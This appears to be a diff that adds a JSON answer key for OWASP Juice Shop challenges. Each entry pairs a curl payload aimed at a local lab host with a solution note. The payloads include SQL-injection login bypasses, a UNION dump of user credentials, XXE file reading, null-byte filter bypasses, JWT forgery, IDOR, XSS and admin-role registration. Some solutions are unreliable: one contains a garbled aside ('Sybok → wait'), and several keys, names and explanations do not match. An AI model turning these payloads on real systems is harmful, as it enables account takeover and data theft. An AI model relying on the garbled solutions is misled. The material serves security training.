@@ -1,0 +1,314 @@
+[
+  {
+    "key": "loginAdminChallenge",
+    "name": "Login Admin",
+    "category": "Injection",
+    "difficulty": 2,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\\'--\",\"password\":\"x\"}' http://juice.local:3000/rest/user/login",
+    "solution": "SQL injection on /rest/user/login: send email=\"admin@juice-sh.op'--\" to close the quoted SQL string and comment the password check. Returns a valid admin JWT."
+  },
+  {
+    "key": "loginJimChallenge",
+    "name": "Login Jim",
+    "category": "Broken Authentication",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -d '{\"email\":\"jim@juice-sh.op\\'--\",\"password\":\"x\"}' -H 'Content-Type: application/json' http://juice.local:3000/rest/user/login",
+    "solution": "Same SQLi trick as Login Admin but with Jim's email."
+  },
+  {
+    "key": "loginBenderChallenge",
+    "name": "Login Bender",
+    "category": "Broken Authentication",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -d '{\"email\":\"bender@juice-sh.op\\'--\",\"password\":\"x\"}' -H 'Content-Type: application/json' http://juice.local:3000/rest/user/login",
+    "solution": "SQLi variant of the Login Admin attack. Any email followed by the comment marker ' -- bypasses the password check."
+  },
+  {
+    "key": "adminSectionChallenge",
+    "name": "Admin Section",
+    "category": "Broken Access Control",
+    "difficulty": 2,
+    "payload": "curl -s http://juice.local:3000/#/administration",
+    "solution": "Angular route /#/administration renders the admin panel. Discoverable by reading the main.js bundle and searching for 'administration'."
+  },
+  {
+    "key": "scoreBoardChallenge",
+    "name": "Score Board",
+    "category": "Broken Access Control",
+    "difficulty": 1,
+    "payload": "curl -s http://juice.local:3000/#/score-board",
+    "solution": "Hidden Angular route /#/score-board. Even without auth it renders the solved/unsolved list — the existence of the route is the challenge."
+  },
+  {
+    "key": "registerAdminChallenge",
+    "name": "Admin Registration",
+    "category": "Improper Input Validation",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"email\":\"hacker@ev.il\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"role\":\"admin\"}' http://juice.local:3000/api/Users/",
+    "solution": "The User registration endpoint accepts the `role` field although the UI never sends it. Set role=admin to register as admin."
+  },
+  {
+    "key": "unionSqlInjectionChallenge",
+    "name": "User Credentials",
+    "category": "Injection",
+    "difficulty": 4,
+    "payload": "curl -s \"http://juice.local:3000/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--\"",
+    "solution": "UNION-based SQLi on /rest/products/search?q= — close the IN() with ')) and UNION-select the users table columns. The admin hash surfaces as product name."
+  },
+  {
+    "key": "directoryListingChallenge",
+    "name": "Confidential Document",
+    "category": "Sensitive Data Exposure",
+    "difficulty": 1,
+    "payload": "curl -s http://juice.local:3000/ftp/acquisitions.md",
+    "solution": "The /ftp/ directory is accessible. Fetch the acquisitions.md file — it contains confidential Juice Shop M&A plans."
+  },
+  {
+    "key": "forgottenDevBackupChallenge",
+    "name": "Forgotten Developer Backup",
+    "category": "Sensitive Data Exposure",
+    "difficulty": 4,
+    "payload": "curl -s 'http://juice.local:3000/ftp/package.json.bak%2500.md'",
+    "solution": "Poison null byte bypass. The .bak extension is blocked, but appending %00.md tricks the static file server into serving package.json.bak as if it were a .md file."
+  },
+  {
+    "key": "easterEggLevelOneChallenge",
+    "name": "Easter Egg",
+    "category": "Broken Access Control",
+    "difficulty": 4,
+    "payload": "curl -s 'http://juice.local:3000/ftp/eastere.gg%2500.md'",
+    "solution": "Same %00 bypass as Forgotten Backup. The file eastere.gg is blocked by the .gg regex but accepted when renamed via null byte."
+  },
+  {
+    "key": "poisonNullByteChallenge",
+    "name": "Poison Null Byte",
+    "category": "Improper Input Validation",
+    "difficulty": 4,
+    "payload": "curl -s 'http://juice.local:3000/ftp/suspicious_errors.yml%2500.md'",
+    "solution": "The fixed file filter uses endsWith('.md') but node's path handling stops at %00. Use any file + %00.md to bypass."
+  },
+  {
+    "key": "resetPasswordJimChallenge",
+    "name": "Reset Jim's Password",
+    "category": "Broken Authentication",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}' http://juice.local:3000/rest/user/reset-password",
+    "solution": "Jim's security question is 'Your eldest siblings middle name'. Public Star Trek data reveals Samuel as the answer (Spock's brother Sybok → wait, Jim = Jim Kirk → George Samuel Kirk)."
+  },
+  {
+    "key": "resetPasswordBenderChallenge",
+    "name": "Reset Bender's Password",
+    "category": "Broken Authentication",
+    "difficulty": 4,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"email\":\"bender@juice-sh.op\",\"answer\":\"Stop\\\\\\'n\\\\\\'Drop\",\"new\":\"x\",\"repeat\":\"x\"}' http://juice.local:3000/rest/user/reset-password",
+    "solution": "Bender from Futurama: 'Name of your favorite stunt performer?' → Stop'n'Drop. The apostrophes are the trick — must be escaped in JSON."
+  },
+  {
+    "key": "exposedMetricsChallenge",
+    "name": "Exposed Metrics",
+    "category": "Observability Failures",
+    "difficulty": 1,
+    "payload": "curl -s http://juice.local:3000/metrics",
+    "solution": "Prometheus metrics endpoint /metrics is exposed without auth. Standard observability misconfig."
+  },
+  {
+    "key": "deprecatedInterfaceChallenge",
+    "name": "Deprecated Interface",
+    "category": "Security Misconfiguration",
+    "difficulty": 2,
+    "payload": "curl -s -X POST -F 'file=@/tmp/evil.xml' http://juice.local:3000/file-upload",
+    "solution": "The /file-upload endpoint accepts .xml files (deprecated MIME). Upload any .xml to trigger the challenge."
+  },
+  {
+    "key": "xxeFileDisclosureChallenge",
+    "name": "XXE Data Access",
+    "category": "XXE",
+    "difficulty": 5,
+    "payload": "echo '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><x>&xxe;</x>' > /tmp/xxe.xml && curl -s -X POST -F 'file=@/tmp/xxe.xml' http://juice.local:3000/file-upload",
+    "solution": "Upload an XML file with SYSTEM entity referencing a local file (/etc/passwd, /etc/hostname). The XML parser resolves the entity and returns the file contents."
+  },
+  {
+    "key": "viewBasketChallenge",
+    "name": "View Basket",
+    "category": "Broken Access Control",
+    "difficulty": 3,
+    "payload": "curl -s -H 'Authorization: Bearer <valid-jwt>' http://juice.local:3000/rest/basket/2",
+    "solution": "IDOR on /rest/basket/:id. The server does not verify the requested basket belongs to the JWT user — just fetches by id. Enumerate from 1 upwards."
+  },
+  {
+    "key": "manipulateBasketChallenge",
+    "name": "Manipulate Basket",
+    "category": "Broken Access Control",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer <jwt>' -d '{\"ProductId\":14,\"BasketId\":2,\"quantity\":1}' http://juice.local:3000/api/BasketItems/",
+    "solution": "Modify BasketId in the BasketItems POST body to a basket other than your own — server trusts the client-supplied BasketId."
+  },
+  {
+    "key": "changeProductChallenge",
+    "name": "Change Product Chart",
+    "category": "Broken Access Control",
+    "difficulty": 3,
+    "payload": "curl -s -X PUT -H 'Content-Type: application/json' -H 'Authorization: Bearer <admin-jwt>' -d '{\"description\":\"<a href=\\\"http://kryptokraken.net\\\">Got coupon</a>\"}' http://juice.local:3000/api/Products/1",
+    "solution": "Admin can PUT /api/Products/:id with arbitrary HTML in the description. Needs admin role (see loginAdminChallenge)."
+  },
+  {
+    "key": "forgedJwtChallenge",
+    "name": "Forged Signed JWT",
+    "category": "Broken Authentication",
+    "difficulty": 6,
+    "payload": "# Python: use jwt.encode(payload, key='', algorithm='HS256') with key from misused RSA pub key. See PentesterLab JWT whitepaper.",
+    "solution": "Juice Shop uses RS256 but the verifier also accepts HS256. Grab the RS256 public key from /encryptionkeys or the JWT header 'x5c', then sign a payload with HS256 using the pub key as HMAC secret."
+  },
+  {
+    "key": "jwtForgedChallenge",
+    "name": "Forgotten Signed JWT",
+    "category": "Broken Authentication",
+    "difficulty": 4,
+    "payload": "# Craft JWT with {\"alg\":\"none\",\"typ\":\"JWT\"} header and {\"data\":{\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}} payload, empty signature.",
+    "solution": "alg=none bypass. Older jsonwebtoken libraries accept a token with no signature if the header declares alg=none."
+  },
+  {
+    "key": "restfulXssChallenge",
+    "name": "API-Only XSS",
+    "category": "Cross Site Scripting",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer <admin-jwt>' -d '{\"name\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\",\"description\":\"xss\",\"price\":1}' http://juice.local:3000/api/Products",
+    "solution": "The product name is rendered unescaped in the admin panel. Admin posts a product name containing <iframe src=javascript:alert()> and the XSS fires on page view."
+  },
+  {
+    "key": "redirectChallenge",
+    "name": "Outdated Allowlist",
+    "category": "Improper Input Validation",
+    "difficulty": 2,
+    "payload": "curl -s 'http://juice.local:3000/redirect?to=https://petstore.swagger.io?x=https://github.com/bkimminich/juice-shop'",
+    "solution": "Open-redirect bypass. The allowlist checks if any allowed URL substring is in the ?to= value, not the actual destination. Chain an allowed URL in the querystring: /redirect?to=https://external.com?honey=https://github.com/bkimminich/juice-shop"
+  },
+  {
+    "key": "fiveStarFeedbackChallenge",
+    "name": "Five-Star Feedback",
+    "category": "Broken Anti Automation",
+    "difficulty": 2,
+    "payload": "curl -s -X DELETE -H 'Authorization: Bearer <admin-jwt>' http://juice.local:3000/api/Feedbacks/1",
+    "solution": "Feedback is only deletable by admin role. Log in as admin (loginAdmin) and DELETE any feedback entry to trigger the challenge."
+  },
+  {
+    "key": "errorHandlingChallenge",
+    "name": "Error Handling",
+    "category": "Security Misconfiguration",
+    "difficulty": 1,
+    "payload": "curl -s 'http://juice.local:3000/rest/product/0/reviews'",
+    "solution": "Trigger any unhandled exception — the default error handler prints a full stack trace."
+  },
+  {
+    "key": "expiredCouponChallenge",
+    "name": "Expired Coupon",
+    "category": "Improper Input Validation",
+    "difficulty": 4,
+    "payload": "curl -s -X PUT 'http://juice.local:3000/rest/basket/1/coupon/y000y000CY'",
+    "solution": "The coupon y000y000CY is expired but applies anyway because server doesn't validate expiration. Coupon codes are base64-derived from date."
+  },
+  {
+    "key": "csrfChallenge",
+    "name": "CSRF",
+    "category": "Broken Access Control",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -H 'Origin: http://htmledit.squarefree.com' -d '{\"currentPassword\":\"\",\"newPassword\":\"pwn\",\"newPasswordRepeat\":\"pwn\"}' 'http://juice.local:3000/rest/user/change-password'",
+    "solution": "POST cross-origin to /rest/user/change-password with a spoofed Origin header. The server accepts change-password via GET query string too, making it CSRFable."
+  },
+  {
+    "key": "ephemeralAccountantChallenge",
+    "name": "Ephemeral Accountant",
+    "category": "Broken Authentication",
+    "difficulty": 4,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"email\":\"accountant@juice-sh.op\\'--\",\"password\":\"x\"}' http://juice.local:3000/rest/user/login",
+    "solution": "The accountant user is soft-deleted in the DB but still present. SQLi bypass with accountant@juice-sh.op' -- logs in as the deleted account."
+  },
+  {
+    "key": "accessLogDisclosureChallenge",
+    "name": "Access Log",
+    "category": "Sensitive Data Exposure",
+    "difficulty": 4,
+    "payload": "curl -s http://juice.local:3000/support/logs/",
+    "solution": "The /support/logs directory is exposed and contains per-day HTTP access logs with user IPs, tokens and auth headers."
+  },
+  {
+    "key": "premiumPaywallChallenge",
+    "name": "Premium Paywall",
+    "category": "Cryptographic Issues",
+    "difficulty": 6,
+    "payload": "curl -s 'http://juice.local:3000/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us'",
+    "solution": "The hidden paywall route is the URL itself. No actual paywall check — the route string is the challenge."
+  },
+  {
+    "key": "extraLanguageChallenge",
+    "name": "Extra Language",
+    "category": "Broken Anti Automation",
+    "difficulty": 5,
+    "payload": "curl -s http://juice.local:3000/assets/i18n/tlh_AA.json",
+    "solution": "The tlh_AA (Klingon) locale file is hidden behind a locale-picker filter but served directly from /assets/i18n/."
+  },
+  {
+    "key": "forgedFeedbackChallenge",
+    "name": "Forged Feedback",
+    "category": "Broken Access Control",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer <user-jwt>' -d '{\"comment\":\"I am someone else\",\"rating\":5,\"UserId\":1}' http://juice.local:3000/api/Feedbacks",
+    "solution": "Include UserId in the POST body — server trusts it over the JWT user. Set UserId=1 to post a feedback on behalf of admin."
+  },
+  {
+    "key": "misplacedSignatureFileChallenge",
+    "name": "Misplaced Signature File",
+    "category": "Observability Failures",
+    "difficulty": 4,
+    "payload": "curl -s http://juice.local:3000/ftp/suspicious_errors.yml%2500.md",
+    "solution": "Same null-byte trick — the suspicious_errors.yml file is the signed manifest exposed via FTP."
+  },
+  {
+    "key": "nullByteChallenge",
+    "name": "Null Byte",
+    "category": "Improper Input Validation",
+    "difficulty": 4,
+    "payload": "curl -s 'http://juice.local:3000/ftp/encrypt.pyc%2500.md'",
+    "solution": "Any non-md, non-pdf file followed by %00.md bypasses the file-type filter."
+  },
+  {
+    "key": "emptyUserRegistrationChallenge",
+    "name": "Empty User Registration",
+    "category": "Improper Input Validation",
+    "difficulty": 3,
+    "payload": "curl -s -X POST -H 'Content-Type: application/json' -d '{\"email\":\"\",\"password\":\"\",\"passwordRepeat\":\"\"}' http://juice.local:3000/api/Users",
+    "solution": "POST empty string email+password. SQLite INSERT accepts '' and creates a user with empty credentials."
+  },
+  {
+    "key": "captchaBypassChallenge",
+    "name": "CAPTCHA Bypass",
+    "category": "Broken Anti Automation",
+    "difficulty": 3,
+    "payload": "# Loop POST /api/Feedbacks 10 times with valid captcha ID but without solving it.",
+    "solution": "Submit 10 feedbacks in < 10 seconds. The captcha gate is a simple rate-limit that can be re-submitted."
+  },
+  {
+    "key": "tokenSaleChallenge",
+    "name": "Token Sale",
+    "category": "Broken Access Control",
+    "difficulty": 4,
+    "payload": "curl -s http://juice.local:3000/#/tokensale-ico-ea",
+    "solution": "Hidden Angular route /#/tokensale-ico-ea. Discoverable in main.js by searching for 'tokensale'."
+  },
+  {
+    "key": "nosqlFeedbackDeleteChallenge",
+    "name": "NoSQL Orders",
+    "category": "Injection",
+    "difficulty": 4,
+    "payload": "curl -s 'http://juice.local:3000/rest/track-order/%27%20or%201=1--'",
+    "solution": "The /rest/track-order/:id endpoint does NoSQL pattern matching. Sending 'or 1=1-- or a regex like .* returns all orders."
+  },
+  {
+    "key": "arbitraryFileWriteChallenge",
+    "name": "Arbitrary File Write",
+    "category": "Improper Input Validation",
+    "difficulty": 6,
+    "payload": "# Upload a zip with path traversal in filename (../../../etc/something)",
+    "solution": "The multer unzip handler doesn't sanitize entry names. Upload a zip with ../../escape in the filename to write outside uploads/."
+  }
+]
